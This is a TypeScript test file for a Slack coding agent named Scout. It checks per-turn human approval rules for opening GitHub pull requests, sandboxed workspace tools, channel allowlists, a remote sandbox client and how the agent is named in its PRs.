    expect(await t.click(t1, "U2")).toThrow(ResumeAuthorizationError);
    expect(await t.click(t1, "U2", false)).toThrow(ResumeAuthorizationError);
    expect(await t.s.result(t1)).toMatchObject({ status: "suspended" });
    expect(t.pushes()).toBe(0);
    expect(t.approvals.count()).toBe(0); // a refused click records nothing
    (await t.click(t1, "U1"))();
    expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
    expect(t.pushes()).toBe(1);
    expect(t.prBody()).toContain("approved there by Rex Quinn.");
  });

  test("anyone: the requester's Approve opens it, and so does someone else's, who is named", async () => {
    for (const [by, name] of [["U1", "Rex Quinn"], ["U2", "Ada Park"]] as const) {
      const t = thread({ rule: "anyone" });
      const t1 = t.start("1.1");
      (await t.click(t1, by))();
      expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
      expect(t.pushes()).toBe(1);
      expect(t.posts()).toHaveLength(1);
      expect(t.prBody()).toContain(`approved there by ${name}.`);
    }
  });

  test("not-requester: the requester's click is refused and nothing is pushed; someone else's then opens it", async () => {
    const t = thread({ rule: "not-requester" });
    const t1 = t.start("1.1");
    expect(await t.click(t1, "U1")).toThrow(ResumeAuthorizationError);
    expect(await t.click(t1, "U1", false)).toThrow(ResumeAuthorizationError); // Deny too
    expect(await t.s.result(t1)).toMatchObject({ status: "suspended" }); // still waiting for someone else
    expect(t.pushes()).toBe(0);
    (await t.click(t1, "U2"))();
    expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
    expect(t.pushes()).toBe(1);
    expect(t.prBody()).toContain("approved there by Ada Park.");
  });

  // The tool itself, without the end of the turn to clean up after it: a Deny or a refusal
  // deletes the card's record as it returns; every other outcome keeps it for the rest of the
  // turn (a retry, or a second run of the tool after the PR opened, needs it). The engine tests below
  // show the turn's end then deletes it.
  test("the tool deletes the card's record at once on a Deny or a refusal, and keeps it otherwise", async () => {
    const run = async (o: { existing?: unknown[]; postStatus?: number; writeError?: boolean; pushError?: string; answer?: boolean; rule?: PrApprover; record?: boolean }) => {
      const approvals = approvalStore(openKnowledge(":memory:"));
      const { sb } = fakeRepo({ pushError: o.pushError });
      const f = (async (_url: string, init?: RequestInit) => {
        if ((init?.method ?? "GET") === "GET") return Response.json(o.existing ?? []);
        return o.postStatus ? new Response("nope", { status: o.postStatus }) : Response.json({ html_url: "https://github.com/acme/widgets/pull/7", number: 7 }, { status: 201 });
      }) as typeof fetch;
      const github: GithubAccess = async (_r, access) => {
        if (access === "write" && o.writeError) throw new Error("not installed");
        return "t";
      };
      const tool = pullRequestTool({ sandboxFor: () => sb, github, fetch: f, approver: o.rule ?? "anyone", approvals });
      const other = { session: "s", turn: "1.0", card: "pr:other" };
      approvals.record(other, "U3"); // another card's record, which no outcome here may touch
      const ctx = {
        sessionId: "s",
        event: { source: "slack", ts: "1.1", user: { id: "U1", attested: true } },
        requestInput: async (r: { id: string }) => {
          if (o.record !== false) approvals.record({ session: "s", turn: "1.1", card: r.id }, "U2");
          return o.answer ?? true;
        },
      } as never;
      const result = (await tool.run({ branch: "scout/x", title: "x" }, ctx)) as Record<string, unknown>;
      expect(approvals.decide(other, "anyone", "U1").approver).toBe("U3");
      return { result, left: approvals.count() - 1 };
    };
    expect(await run({ answer: false })).toMatchObject({ result: { status: "denied" }, left: 0 });
    expect(await run({ rule: "requester" })).toMatchObject({ result: { status: "refused" }, left: 0 }); // U2's record, the rule now requester
    expect(await run({})).toMatchObject({ result: { status: "opened" }, left: 1 });
    expect(await run({ existing: [{ html_url: "u", number: 3 }] })).toMatchObject({ result: { status: "exists" }, left: 1 });
    expect(await run({ writeError: true })).toMatchObject({ result: { error: expect.stringContaining("no GitHub credential") }, left: 1 });
    expect(await run({ postStatus: 422 })).toMatchObject({ result: { error: expect.stringContaining("GitHub rejected") }, left: 1 });
    expect(await run({ pushError: "push: 409" })).toMatchObject({ result: { error: expect.stringContaining("push failed") }, left: 1 });
  });

  test("not-requester: the tool run again in its turn after the PR opened finds its record and reports the PR as existing; no second PR", async () => {
    // June runs a remote tool at least once: a run cut off after the PR opened, before June
    // saved its result, is run again in the same turn. It runs from the top, requestInput
    // returns the stored answer (no new click, no new record), and the PR is already open.
    const approvals = approvalStore(openKnowledge(":memory:"));
    const { sb } = fakeRepo();
    const open: unknown[] = [];
    const posts: unknown[] = [];
    const f = (async (_url: string, init?: RequestInit) => {
      if ((init?.method ?? "GET") === "GET") return Response.json(open);
      posts.push(init?.body);
      const pr = { html_url: "https://github.com/acme/widgets/pull/7", number: 7 };
      open.push(pr);
      return Response.json(pr, { status: 201 });
    }) as typeof fetch;
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: f, approver: "not-requester", approvals });
    let clicked = false;
    const ctx = {
      sessionId: "s",
      event: { source: "slack", ts: "1.1", user: { id: "U1", attested: true } },
      requestInput: async (r: { id: string }) => {
        if (!clicked) approvals.record({ session: "s", turn: "1.1", card: r.id }, "U2"); // U2's click, recorded once
        clicked = true;
        return true;
      },
    } as never;
    expect(await tool.run({ branch: "scout/x", title: "x" }, ctx)).toMatchObject({ status: "opened", number: 7 });
    // …the same turn runs the tool again:
    expect(await tool.run({ branch: "scout/x", title: "x" }, ctx)).toMatchObject({ status: "exists", number: 7 });
    expect(posts).toHaveLength(1);
  });

  test("a record is for its own turn: the same card in a later turn finds none, and under not-requester is refused", async () => {
    const approvals = approvalStore(openKnowledge(":memory:"));
    const { sb, published } = fakeRepo();
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f, approver: "not-requester", approvals });
    let card = "";
    const inTurn = (ts: string, record: boolean) => ({
      sessionId: "s",
      event: { source: "slack", ts, user: { id: "U1", attested: true } },
      requestInput: async (r: { id: string }) => {
        card = r.id;
        if (record) approvals.record({ session: "s", turn: ts, card: r.id }, "U2");
        return true;
      },
    }) as never;
    // An earlier turn's record for this very card, left behind (say, by a restart).
    await tool.run({ branch: "scout/x", title: "x" }, { ...(inTurn("1.0", false) as object), requestInput: async (r: { id: string }) => ((card = r.id), false) } as never);
    approvals.record({ session: "s", turn: "1.0", card }, "U2");
    expect(await tool.run({ branch: "scout/x", title: "x" }, inTurn("1.1", false))).toMatchObject({ status: "refused" });
    expect(published.filter((p) => p.op === "push")).toHaveLength(0);
    // In its own turn the same record is what lets it through.
    expect(await tool.run({ branch: "scout/x", title: "x" }, inTurn("1.2", true))).toMatchObject({ status: "opened" });
  });

  test("not-requester: a turn with no Slack event (nothing to key a record by) is refused", async () => {
    const { sb, published } = fakeRepo();
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: fakeGithub().f, approver: "not-requester", approvals: approvalStore(openKnowledge(":memory:")) });
    expect(await tool.run({ branch: "scout/x", title: "x" }, { sessionId: "s", requestInput: async () => true } as never)).toMatchObject({ status: "refused" });
    expect(published.filter((p) => p.op === "push")).toHaveLength(0);
  });

  // The gate against a session it watches: what it records, and that it stops watching.
  describe("the gate's watch on the turn", () => {
    const watched = () => {
      const listeners = new Set<(e: TurnEvent) => void>();
      const session = {
        pending: () => ({ turnId: "t1" }),
        observe: (cb: (e: TurnEvent) => void) => (listeners.add(cb), () => void listeners.delete(cb)),
      };
      const store = approvalStore(openKnowledge(":memory:"));
      const gate = approverGate("anyone", store, () => session);
      const click = (by: string) => gate({ policy: APPROVER_POLICY, scope: { requester: "U1", turn: "1.1" }, by, agent: "a", session: "s", request: { id: "pr:x", prompt: "" } });
      const emit = (e: object) => [...listeners].forEach((cb) => cb({ turnId: "t1", ...e } as TurnEvent));
      const key = { session: "s", turn: "1.1", card: "pr:x" };
      return { listeners, store, click, emit, key };
    };
    test("two clicks let through at once: the one June applied is recorded, not the last one asked", () => {
      const w = watched();
      expect(w.click("U2")).toBe(true);
      expect(w.click("U3")).toBe(true); // asked too, but its resume loses
      expect(w.store.count()).toBe(0); // nothing until June applies an answer
      w.emit({ type: "input.resolved", inputId: "pr:x", outcome: "answered", by: "U2" });
      expect(w.store.decide(w.key, "anyone", "U1").approver).toBe("U2");
    });
    for (const end of ["turn.completed", "turn.failed", "turn.cancelled"]) {
      test(`${end}: the turn's records go, and nothing is left watching`, () => {
        const w = watched();
        w.click("U2");
        w.emit({ type: "input.resolved", inputId: "pr:x", outcome: "answered", by: "U2" });
        w.emit({ type: end, text: "", error: { message: "x" } });
        expect(w.store.count()).toBe(0);
        expect(w.listeners.size).toBe(0);
      });
    }
    test("parked again on another card: this card's record goes, and nothing is left watching", () => {
      const w = watched();
      w.click("U2");
      w.emit({ type: "input.resolved", inputId: "pr:x", outcome: "answered", by: "U2" });
      w.emit({ type: "input.requested", request: { id: "pr:y", prompt: "" } });
      expect(w.store.count()).toBe(0);
      expect(w.listeners.size).toBe(0);
    });
    test("a park retired by a reset: nothing recorded, nothing left watching", () => {
      const w = watched();
      w.click("U2");
      w.emit({ type: "input.resolved", inputId: "pr:x", outcome: "retired" });
      expect(w.store.count()).toBe(0);
      expect(w.listeners.size).toBe(0);
    });
  });

  // Through the engine: whatever the outcome, no approval outlives its turn.
  describe("no approval outlives its turn", () => {
    const outcome = async (o: Thread, by = "U2", answer = true) => {
      const t = thread({ rule: "anyone", ...o });
      const t1 = t.start("1.1");
      (await t.click(t1, by, answer))();
      expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
      expect(t.approvals.count()).toBe(0);
      return t;
    };
    test("opened: kept until the turn ends, then gone", async () => {
      const t = await outcome({});
      expect(t.toolResults()[0]).toMatchObject({ status: "opened" });
    });
    test("an open pull request for the branch already exists: kept until the turn ends, then gone", async () => {
      const t = await outcome({ existing: [{ html_url: "https://github.com/acme/widgets/pull/3", number: 3 }] });
      expect(t.toolResults()[0]).toMatchObject({ status: "exists" });
    });
    test("no write credential", async () => {
      const t = await outcome({ writeError: true });
      expect(String(t.toolResults()[0]?.error)).toContain("no GitHub credential");
      expect(t.pushes()).toBe(0);
    });
    test("GitHub rejects the pull request", async () => {
      const t = await outcome({ postStatus: 422 });
      expect(String(t.toolResults()[0]?.error)).toContain("GitHub rejected the PR: 422");
    });
    test("denied", async () => {
      const t = await outcome({}, "U2", false);
      expect(t.toolResults()[0]).toMatchObject({ status: "denied" });
      expect(t.pushes()).toBe(0);
    });
    test("refused at the push (a card from before the rule, under not-requester)", async () => {
      const t = thread({ rule: "not-requester", preDeploy: () => true });
      const t1 = t.start("1.1");
      (await t.click(t1, "U1"))();
      expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
      expect(t.toolResults()[0]).toMatchObject({ status: "refused" });
      expect(t.approvals.count()).toBe(0);
    });
    test("a push that failed with no retry: kept for the rest of the turn, gone when it ends", async () => {
      const t = thread({ rule: "anyone", pushFailures: 1 });
      const t1 = t.start("1.1");
      (await t.click(t1, "U2"))();
      expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
      expect(String(t.toolResults()[0]?.error)).toContain("push failed");
      expect(t.approvals.count()).toBe(0);
    });
  });

  test("not-requester: a retry in the same turn after a failed push still has its approval, and names the approver", async () => {
    const t = thread({ rule: "not-requester", pushFailures: 1, calls: 2 });
    const t1 = t.start("1.1");
    (await t.click(t1, "U2"))();
    expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
    const [first, second] = t.toolResults();
    expect(String(first?.error)).toContain("push failed");
    expect(second).toMatchObject({ status: "opened" });
    expect(t.pushes()).toBe(2);
    expect(t.prBody()).toContain("approved there by Ada Park.");
    expect(t.approvals.count()).toBe(0);
  });

  test("an approval left from an earlier turn never answers a later card with the same id", async () => {
    // Turn 1: U2 approves under not-requester, and the push fails, so its record stays for
    // the rest of turn 1. Turn 2 asks for the same change (the same card id); its card is one
    // June resumes for the requester without asking the gate (as for a card parked before
    // PR_APPROVER). The requester's own click must not borrow U2's approval.
    const t = thread({ rule: "not-requester", turns: 2, pushFailures: 1, preDeploy: (turn) => turn === 2 });
    const t1 = t.start("1.1");
    (await t.click(t1, "U2"))();
    expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
    const t2 = t.start("1.2");
    (await t.click(t2, "U1"))();
    expect(await t.s.result(t2)).toMatchObject({ status: "completed" });
    expect(t.toolResults()[1]).toMatchObject({ status: "refused" });
    expect(t.pushes()).toBe(1); // turn 1's failed push only
    expect(t.posts()).toHaveLength(0);
  });

  test("a card parked before this deploy: under requester and anyone the requester's Approve opens it, under not-requester nothing is pushed", async () => {
    for (const [rule, opened, name] of [["requester", true, "Rex Quinn"], ["anyone", true, undefined], ["not-requester", false, undefined]] as const) {
      const t = thread({ rule, preDeploy: () => true });
      const t1 = t.start("1.1");
      expect(await t.click(t1, "U2")).toThrow(ResumeAuthorizationError); // June's default: the requester only
      (await t.click(t1, "U1"))();
      expect(await t.s.result(t1)).toMatchObject({ status: "completed" });
      expect(t.toolResults()[0]).toMatchObject({ status: opened ? "opened" : "refused" });
      expect(t.pushes()).toBe(opened ? 1 : 0);
      if (opened) expect(t.prBody()).toContain(name ? `approved there by ${name}.` : "approved there.");
      expect(t.approvals.count()).toBe(0);
    }
  });

  test("the store: the latest approval for a card wins, decide checks the rule against it, and stale ones are pruned", () => {
    const store = approvalStore(openKnowledge(":memory:"));
    const k = { session: "s", turn: "1.1", card: "pr:x" };
    store.record(k, "U2");
    store.record(k, "U3"); // U2's resume failed (say), and U3's click answered
    expect(store.decide(k, "anyone", "U1")).toEqual({ ok: true, approver: "U3" });
    expect(store.decide(k, "requester", "U1")).toEqual({ ok: false, approver: "U3" }); // the rule changed since the click
    expect(store.decide({ ...k, turn: "1.2" }, "not-requester", "U1")).toEqual({ ok: false });
    expect(store.decide({ ...k, turn: "1.2" }, "requester", "U1")).toEqual({ ok: true, approver: "U1" });
    expect(store.decide({ ...k, turn: "1.2" }, "anyone", "U1")).toEqual({ ok: true, approver: undefined });
    store.record({ ...k, card: "pr:old" }, "U2", new Date(Date.now() - APPROVAL_TTL_MS - 1000));
    expect(store.prune()).toBe(1);
    expect(store.count()).toBe(1);
    store.forgetTurn("s", "1.1");
    expect(store.count()).toBe(0);
  });

  test("the gate refuses another policy, and a card that names no turn", () => {
    const store = approvalStore(openKnowledge(":memory:"));
    const gate = approverGate("anyone", store, () => undefined);
    const ask = (policy: string, scope: unknown) => gate({ policy, scope, by: "U2", agent: "a", session: "s", request: { id: "pr:x", prompt: "" } });
    expect(ask("something-else", { requester: "U1", turn: "1.1" })).toBe(false);
    expect(ask(APPROVER_POLICY, { requester: "U1" })).toBe(false);
    expect(store.count()).toBe(0);
    expect(ask(APPROVER_POLICY, { requester: "U1", turn: "1.1" })).toBe(true);
    expect(store.count()).toBe(1);
  });
});

describe("workspace tools", () => {
  test("every command runs as the account commits are by; without one (lookup failed), it runs as is", async () => {
    const seen: (Record<string, string> | undefined)[] = [];
    const sb: Sandbox = {
      async exec(_c, opts) { seen.push(opts?.env); return { exitCode: 0, stdout: "", stderr: "" }; },
      async readFile() { return ""; },
      async writeFile() {},
      ...noPublish,
    };
    const bot = { name: "acme-agent[bot]", email: "900+acme-agent[bot]@users.noreply.github.com" };
    const execWith = (commitAs?: () => Promise<typeof bot>) => workspaceTools(() => sb, { commitAs }).find((t) => t.spec.name === "workspace_exec")!;
    await execWith(async () => bot).run({ command: "git commit -am x" }, {} as never);
    expect(seen[0]).toEqual({ GIT_AUTHOR_NAME: bot.name, GIT_AUTHOR_EMAIL: bot.email, GIT_COMMITTER_NAME: bot.name, GIT_COMMITTER_EMAIL: bot.email });
    expect(await execWith(async () => { throw new Error("502"); }).run({ command: "ls" }, {} as never)).toMatchObject({ exitCode: 0 });
    expect(seen[1]).toBeUndefined();
  });

  test("exec runs in the repo dir and keeps the TAIL of long output", async () => {
    const seen: { command: string; opts?: ExecOptions }[] = [];
    const sb: Sandbox = {
      async exec(command, opts) { seen.push({ command, opts }); return { exitCode: 1, stdout: "x".repeat(20_000) + "FAILED: 2 tests", stderr: "" }; },
      async readFile() { return ""; },
      async writeFile() {},
      ...noPublish,
    };
    const exec = workspaceTools(() => sb).find((t) => t.spec.name === "workspace_exec")!;
    const out = (await exec.run({ command: "bun test" }, {} as never)) as { stdout: string; exitCode: number };
    expect(seen[0]!.opts?.cwd).toBe("/workspace/repo");
    expect(out.exitCode).toBe(1);
    expect(out.stdout.endsWith("FAILED: 2 tests")).toBe(true);
    expect(out.stdout.length).toBeLessThan(12_100);
  });

  test("the sandbox is resolved per session, from ctx — not from model input", async () => {
    const ids: string[] = [];
    const tools = workspaceTools((ctx) => { ids.push(ctx.sessionId); return { exec: async () => ({ exitCode: 0, stdout: "", stderr: "" }), readFile: async () => "", writeFile: async () => {}, ...noPublish }; });
    await tools[0]!.run({ command: "ls", sessionId: "slack:EVIL:1" }, { sessionId: "slack:C1:1.1" } as never);
    expect(ids).toEqual(["slack:C1:1.1"]);
  });

  test("a sandbox failure comes back to the model as { error }, not a failed turn", async () => {
    const down: Sandbox = {
      async exec() { throw new Error("no sandbox runner is connected"); },
      async readFile(path) { throw new Error(`no such file: ${path}`); },
      async writeFile() { throw new Error("sandbox PUT /file: 503 busy"); },
      ...noPublish,
    };
    const [exec, read, write] = workspaceTools(() => down);
    expect(await exec!.run({ command: "ls" }, {} as never)).toEqual({ error: "no sandbox runner is connected" });
    expect(await read!.run({ path: "README.md" }, {} as never)).toEqual({ error: "no such file: /workspace/repo/README.md" });
    expect(await write!.run({ path: "a", content: "b" }, {} as never)).toEqual({ error: "sandbox PUT /file: 503 busy" });
  });

  test("every workspace tool's run is an async function, so June runs it as async (it checks constructor.name)", () => {
    for (const t of workspaceTools(() => ({}) as Sandbox)) expect(t.run.constructor.name).toBe("AsyncFunction");
  });

  test("clip is a no-op under the limit", () => {
    expect(clip("short")).toBe("short");
  });
});

describe("publicChannelsOnly", () => {
  const ev = (event: Record<string, unknown>) => ({ type: "event_callback", event });
  const open = publicChannelsOnly(new Set());
  const listed = publicChannelsOnly(parseAllowlist("C1, C2"));

  test("public-channel messages on the allowlist pass; DMs and private channels never do", () => {
    expect(listed(ev({ type: "message", channel: "C1", channel_type: "channel" }))).toBe(true);
    for (const allow of [open, listed]) {
      expect(allow(ev({ type: "message", channel: "D1", channel_type: "im" }))).toBe(false);
      expect(allow(ev({ type: "message", channel: "G1", channel_type: "group" }))).toBe(false);
      expect(allow(ev({ type: "message", channel: "G2", channel_type: "mpim" }))).toBe(false);
    }
  });

  // An empty AGENT_CHANNELS means nowhere (#82), for every event kind the gate sees: in a
  // channel on the list, one off it, and with no list at all. A follow-up in a thread the
  // agent joined is a plain `message` reply, so it is the "thread reply" row.
  describe("every event kind × empty / listed / unlisted", () => {
    const kinds: [string, (channel: string) => Record<string, unknown>][] = [
      ["app_mention", (channel) => ({ type: "app_mention", channel, user: "U1", text: "<@UBOT> hi", ts: "2.2" })],
      ["top-level message", (channel) => ({ type: "message", channel, channel_type: "channel", user: "U1", text: "hi", ts: "2.2" })],
      ["thread reply (a follow-up)", (channel) => ({ type: "message", channel, channel_type: "channel", user: "U1", text: "and?", ts: "2.3", thread_ts: "2.2" })],
      ["message edit", (channel) => ({ type: "message", subtype: "message_changed", channel, channel_type: "channel", message: { ts: "2.2" } })],
      ["message deletion", (channel) => ({ type: "message", subtype: "message_deleted", channel, channel_type: "channel", deleted_ts: "2.2" })],
      ["reaction_added", (channel) => ({ type: "reaction_added", user: "U2", reaction: "+1", item: { type: "message", channel, ts: "2.2" } })],
      ["reaction_removed", (channel) => ({ type: "reaction_removed", user: "U2", reaction: "+1", item: { type: "message", channel, ts: "2.2" } })],
      ["another event naming a channel", (channel) => ({ type: "channel_rename", channel })],
    ];
    for (const [kind, event] of kinds) {
      test(kind, () => {
        expect(listed(ev(event("C1")))).toBe(true);
        expect(listed(ev(event("C3")))).toBe(false);
        expect(open(ev(event("C1")))).toBe(false);
        expect(open(ev(event("C9")))).toBe(false);
        // DM_MODE lets DMs in, never a channel, with or without a list.
        expect(publicChannelsOnly(new Set(), { dms: true })(ev(event("C1")))).toBe(false);
      });
    }
  });

  test("what isn't an event callback is not the gate's to judge", () => {
    expect(open({ type: "url_verification", challenge: "x" })).toBe(true);
  });

  test("a mention carries no channel_type, so only an allowlisted channel admits it", () => {
    expect(open(ev({ type: "app_mention", channel: "C1" }))).toBe(false);
    expect(listed(ev({ type: "app_mention", channel: "C1" }))).toBe(true);
    expect(listed(ev({ type: "app_mention", channel: "C3" }))).toBe(false);
  });

  test("a reaction names its channel under item and carries no channel_type, so only an allowlisted channel admits it", () => {
    const reaction = (type: string, channel: string) => ev({ type, user: "U2", reaction: "+1", item: { type: "message", channel, ts: "1.1" } });
    expect(listed(reaction("reaction_added", "C1"))).toBe(true);
    expect(listed(reaction("reaction_removed", "C2"))).toBe(true);
    expect(listed(reaction("reaction_added", "C3"))).toBe(false);
    expect(open(reaction("reaction_added", "C1"))).toBe(false);
  });

  test("with an allowlist, a public channel outside it is refused too", () => {
    expect(listed(ev({ type: "message", channel: "C3", channel_type: "channel" }))).toBe(false);
  });

  test("with dms on, a DM passes, whatever the allowlist, even an empty one; private channels and group DMs still don't", () => {
    for (const list of [parseAllowlist("C1"), new Set<string>()]) {
      const withDms = publicChannelsOnly(list, { dms: true });
      expect(withDms(ev({ type: "message", channel: "D1", channel_type: "im" }))).toBe(true);
      expect(withDms(ev({ type: "message", channel: "G1", channel_type: "group" }))).toBe(false);
      expect(withDms(ev({ type: "message", channel: "G2", channel_type: "mpim" }))).toBe(false);
      expect(withDms(ev({ type: "message", channel: "C3", channel_type: "channel" }))).toBe(false);
    }
  });
});

describe("DM redirect", () => {
  const dm = (event: Record<string, unknown>) => directMessage({ type: "event_callback", event: { type: "message", channel: "D1", channel_type: "im", user: "U1", text: "hi", ...event } });

  test("a person's new DM gets one; an edit, a deletion, a bot's message (its own reply) and a channel message don't", () => {
    expect(dm({})).toEqual({ channel: "D1", user: "U1" });
    expect(dm({ subtype: "message_changed" })).toBeUndefined();
    expect(dm({ subtype: "message_deleted" })).toBeUndefined();
    expect(dm({ bot_id: "B1", user: "UBOT" })).toBeUndefined();
    expect(dm({ channel: "C1", channel_type: "channel" })).toBeUndefined();
    expect(dm({ type: "app_mention", channel_type: undefined })).toBeUndefined();
  });

  test("the reply links the allowlisted channels; with none, it says it isn't set up in any yet", () => {
    expect(redirectText(parseAllowlist("C1"))).toContain("Ask me in <#C1>.");
    expect(redirectText(parseAllowlist("C1,C2"))).toContain("Ask me in <#C1> or <#C2>.");
    // An empty list means nowhere (#82), never "any public channel".
    const none = redirectText(new Set());
    expect(none).toContain("I'm not set up in any channel yet");
    expect(none).not.toContain("any public channel");
    expect(none).not.toContain("Ask me in");
  });
});

describe("remoteSandbox client", () => {
  test("speaks the daemon's /v1/sandboxes/{id} API with a bearer token", async () => {
    const reqs: { url: string; method: string; auth: string | null; body?: string }[] = [];
    const f = (async (url: string, init: RequestInit) => {
      reqs.push({ url, method: init.method ?? "GET", auth: new Headers(init.headers).get("authorization"), body: init.body as string | undefined });
      if (url.includes("/exec")) return Response.json({ exitCode: 0, stdout: "ok", stderr: "" });
      if (init.method === "GET") return url.includes("missing") ? new Response("", { status: 404 }) : new Response("content");
      return new Response(null, { status: 204 });
    }) as typeof fetch;
    const sb = remoteSandbox("slack_C1_1.1", { url: "https://fb.example/", token: "tok", fetch: f });

    expect(await sb.exec("ls", { cwd: "/w", timeoutMs: 5 })).toEqual({ exitCode: 0, stdout: "ok", stderr: "" });
    expect(await sb.readFile("/w/a.ts")).toBe("content");
    await sb.writeFile("/w/b.ts", "x");
    await expect(sb.readFile("/w/missing")).rejects.toThrow(/no such file/);

    expect(reqs[0]).toMatchObject({ url: "https://fb.example/v1/sandboxes/slack_C1_1.1/exec", method: "POST", auth: "Bearer tok" });
    expect(JSON.parse(reqs[0]!.body!)).toEqual({ command: "ls", cwd: "/w", timeoutMs: 5 });
    expect(reqs[1]!.url).toBe("https://fb.example/v1/sandboxes/slack_C1_1.1/file?path=%2Fw%2Fa.ts");
    expect(reqs[2]).toMatchObject({ method: "PUT", body: "x" });
  });

  test("stage and push are POSTs with the request as JSON; any non-2xx is the daemon's reason", async () => {
    const STAGE = `1790000000-${"c".repeat(32)}`;
    const reqs: { url: string; body: unknown }[] = [];
    const f = (async (url: string, init: RequestInit) => {
      reqs.push({ url, body: JSON.parse(init.body as string) });
      if (url.endsWith("/stage")) return Response.json({ stage: STAGE, sha: "a".repeat(40), baseSha: "b".repeat(40), commits: 1, stat: "", authors: [], files: [], patch: "", patchTruncated: false, diffSha256: "d".repeat(64) });
      return Response.json({ error: `stage ${STAGE} isn't here: it never completed, was already used, or expired; stage again` }, { status: 404 });
    }) as typeof fetch;
    const sb = remoteSandbox("s1", { url: "https://fb.example", token: "tok", fetch: f });
    expect((await sb.stage({ repo: { owner: "acme", name: "widgets" }, base: "main", branch: "scout/x", token: "r" })).stage).toBe(STAGE);
    await expect(sb.push({ stage: STAGE, repo: { owner: "acme", name: "widgets" }, sha: "a".repeat(40), branch: "scout/x", token: "w" })).rejects.toThrow(`push: 404 stage ${STAGE} isn't here`);
    expect(reqs.map((r) => r.url)).toEqual(["https://fb.example/v1/sandboxes/s1/stage", "https://fb.example/v1/sandboxes/s1/push"]);
    expect(reqs[0]!.body).toEqual({ owner: "acme", name: "widgets", base: "main", branch: "scout/x", token: "r" });
    expect(reqs[1]!.body).toEqual({ stage: STAGE, owner: "acme", name: "widgets", sha: "a".repeat(40), branch: "scout/x", token: "w" });
  });

  test("a publish error that isn't JSON still surfaces with its status and text", async () => {
    const f = (async () => new Response("unauthorized", { status: 401 })) as unknown as typeof fetch;
    const sb = remoteSandbox("s1", { url: "https://fb.example", token: "bad", fetch: f });
    await expect(sb.stage({ repo: { owner: "acme", name: "widgets" }, base: "main", branch: "scout/x" })).rejects.toThrow("stage: 401 unauthorized");
  });

  test("a daemon error surfaces with its status", async () => {
    const f = (async () => new Response("vm failed to boot", { status: 503 })) as unknown as typeof fetch;
    await expect(remoteSandbox("s", { url: "https://fb", token: "t", fetch: f }).exec("ls")).rejects.toThrow(/503 vm failed to boot/);
  });
});

describe("agent identity — the name is per-install config", () => {
  test("defaults to scout; a blank name falls back to it", () => {
    expect(DEFAULT_AGENT_NAME).toBe("scout");
    expect(agentIdentity()).toEqual({ name: "scout", coAuthor: undefined });
    expect(agentIdentity("  ", " ")).toEqual({ name: "scout", coAuthor: undefined });
  });

  test("a renamed agent uses its own branch prefix and PR attribution", async () => {
    const { sb, calls } = fakeRepo();
    const gh = fakeGithub();
    const tool = pullRequestTool({ sandboxFor: () => sb, github: staticToken("t"), fetch: gh.f, identity: agentIdentity("atlas") });
    expect(await tool.run({ branch: "scout/x", title: "x" }, {} as never)).toMatchObject({ error: expect.stringContaining('"atlas/"') });
    expect(calls).toHaveLength(0);

    const store = memorySessionStore();
    const call: ModelReply = { text: "", toolCalls: [{ id: "c1", name: "open_pull_request", input: { branch: "atlas/fix", title: "Fix" } }] };
    const s = new AgentSession("agent", "slack:C1:1.1", store, new Sink(), scripted([call, { text: "done", toolCalls: [] }]), [tool], noRuntime);
    const t1 = s.start({ turnId: "t1", userText: "pr" }).turnId;
    s.resume(t1, ((await s.result(t1)) as { request: { id: string } }).request.id, true);
    await s.result(t1);
    const post = gh.reqs.find((r) => r.method === "POST")!;
    expect((post.body as { body: string }).body).toContain("Opened by Atlas from Slack");
  });

  test("the PR names who approved it, never by Slack user id; unknown, it says only that it was approved", async () => {
    // The turn's own speaker is the requester (U0REQUESTER); the approver is whoever the app
    // recorded answering this card in this turn (src/approvals.ts), and only they are named.
    const bodyWith = async (approverName?: (id: string) => Promise<string | undefined>, clicked: string | null = "U0SECRETID") => {
      const gh = fakeGithub();
      const approvals = approvalStore(openKnowledge(":memory:"));
      const tool = pullRequestTool({ sandboxFor: () => fakeRepo().sb, github: staticToken("t"), fetch: gh.f, approverName, approver: "anyone", approvals });
      const ctx = {
        sessionId: "s",
        event: { source: "slack", ts: "9.9", user: { id: "U0REQUESTER", attested: true } },
        requestInput: async (r: { id: string }) => {
          if (clicked) approvals.record({ session: "s", turn: "9.9", card: r.id }, clicked);
          return true;
        },
      } as never;
      await tool.run({ branch: "scout/x", title: "x" }, ctx);
      return (gh.reqs.find((r) => r.method === "POST")!.body as { body: string }).body;
    };
    const names = async (id: string) => ({ U0SECRETID: "Ada Park", U0REQUESTER: "Rex Quinn" } as Record<string, string>)[id];
    // Who clicked isn't known (a card from before this deploy, under anyone): nobody is named, the requester least of all.
    const unknown = await bodyWith(names, null);
    expect(unknown).toContain("Opened by Scout from Slack, approved there.");
    expect(unknown).not.toContain("Rex Quinn");
    const named = await bodyWith(names);
    expect(named).toContain("Opened by Scout from Slack, approved there by Ada Park.");
    expect(named).not.toContain("Rex Quinn");
    for (const body of [named, await bodyWith(), await bodyWith(async () => undefined), await bodyWith(async () => { throw new Error("users.info down"); })]) {
      expect(body).not.toContain("U0SECRETID");
    }
    expect(await bodyWith()).toContain("Opened by Scout from Slack, approved there.");
  });

  test("instructions carry the name, the prefix, and the trailer only when configured", () => {
    const withTrailer = systemPrompt(agentIdentity("scout", "Scout <scout@example.com>"));
    expect(withTrailer).toContain("You are Scout");
    expect(withTrailer).toContain("scout/<short-slug>");
    expect(withTrailer).toContain("Co-authored-by: Scout <scout@example.com>");
    expect(systemPrompt(agentIdentity())).not.toContain("Co-authored-by");
  });

  test("a name that can't be a Slack handle / branch prefix is refused loudly", () => {
    expect(() => agentIdentity("my agent")).toThrow(/lowercase handle/);
    expect(() => agentIdentity("../x")).toThrow(/lowercase handle/);
  });
});
